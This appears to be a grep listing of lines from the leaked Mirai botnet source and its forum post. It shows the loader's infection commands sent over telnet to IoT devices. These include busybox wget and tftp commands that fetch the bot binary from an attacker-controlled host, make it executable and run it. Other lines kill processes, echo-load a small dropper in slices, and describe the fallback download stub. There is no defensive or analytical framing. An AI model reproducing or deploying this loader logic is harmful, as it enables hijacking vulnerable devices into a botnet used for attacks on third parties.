# Some Mirai commands
/bin/busybox ps
/bin/busybox kill -9
/bin/busybox mkdir
/bin/busybox rm
/bin/busybox cp
/bin/busybox echo
/bin/busybox wget
/bin/busybox tftp

# Some important lines of Mirai source code
mirai/bot/table.h:#define TABLE_SCAN_PS                   27  /* "/bin/busybox ps" */
mirai/bot/table.h:#define TABLE_SCAN_KILL_9               28  /* "/bin/busybox kill -9 " */
mirai/tools/single_load.c:#define TOKEN           "/bin/busybox VDOSS"
mirai/tools/single_load.c:                        if (memmem(buf, got, "BusyBox", 7) != NULL)
mirai/tools/single_load.c:                        if (strcasestr(buf, "BusyBox") != NULL || matchPrompt(buf))
mirai/tools/single_load.c:                            sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[0], state->path[0], state->path[0]);
mirai/tools/single_load.c:                            sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[0], state->path[0], state->path[0]);
mirai/tools/single_load.c:                            sockprintf(state->fd, "/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd]);
mirai/tools/single_load.c:                                sockprintf(state->fd, "/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd]);
mirai/tools/single_load.c:                            sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd], state->path[state->pathInd], state->path[state->pathInd]);
mirai/tools/single_load.c:                            sockprintf(state->fd, "/bin/busybox echo -ne %s >> %s/a && /bin/busybox VDOSS\r\n", binary.slices[state->echoInd++], state->path[state->pathInd]);
mirai/tools/single_load.c:                            sockprintf(state->fd, "%s/a %s; /bin/busybox VDOSS\r\n", state->path[state->pathInd], run_arg);
loader/src/headers/connection.h:        TELNET_UPLOAD_TFTP,     // 17
loader/src/headers/connection.h:int connection_upload_tftp(struct connection *conn);
loader/src/headers/includes.h:#define TOKEN_QUERY     "/bin/busybox ECCHI"
loader/src/headers/includes.h:#define EXEC_QUERY     "/bin/busybox IHCCE"
loader/src/headers/server.h:    volatile uint32_t total_input, total_logins, total_echoes, total_wgets, total_tftps, total_successes, total_failures;
loader/src/headers/server.h:    char *wget_host_ip, *tftp_host_ip;
loader/src/headers/telnet_info.h:        UPLOAD_TFTP
loader/src/server.c:    srv->tftp_host_ip = thip;
loader/src/server.c:                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
loader/src/server.c:                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
loader/src/server.c:                            util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
loader/src/server.c:                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
loader/src/server.c:                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
loader/src/server.c:                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
loader/src/server.c:                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
loader/src/server.c:                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
loader/src/server.c:                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
loader/src/server.c:                                case UPLOAD_TFTP:
loader/src/server.c:                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
loader/src/server.c:                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
loader/src/server.c:                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
loader/src/server.c:                                    printf("tftp\n");
loader/src/server.c:                    case TELNET_UPLOAD_TFTP:
loader/src/server.c:                        consumed = connection_upload_tftp(conn);
loader/src/server.c:                            printf("[FD%d] Finished tftp loading\n", conn->fd);
loader/src/server.c:                            ATOMIC_INC(&wrker->srv->total_tftps);
loader/src/server.c:                        else if (consumed < -1) // Did not have permission to TFTP
loader/src/server.c:                            printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
loader/src/server.c:                            util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
loader/src/server.c:                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
loader/src/server.c:                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
loader/src/main.c:    /*                                                                                   wget address           tftp address */
loader/src/main.c:        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
loader/src/main.c:               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
loader/src/connection.c:                    util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
loader/src/connection.c:                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
loader/src/connection.c:                        util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
loader/src/connection.c:                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n",
loader/src/connection.c:    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
loader/src/connection.c:    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
loader/src/connection.c:        conn->info.upload_method = UPLOAD_TFTP;
loader/src/connection.c:int connection_upload_tftp(struct connection *conn)
ForumPost.md:It detects if there is wget or tftp, and tries to download the binary using
ForumPost.txt:It detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget. You can find code to compile the tiny downloader stub h ere
ForumPost.txt:You need to edit your main.c for the dlr to include the HTTP server IP. The idea is, if the iot device doesn have tftp or wget, then it will echo load this 2kb binary, which download the real binary, since echo loading really slow.

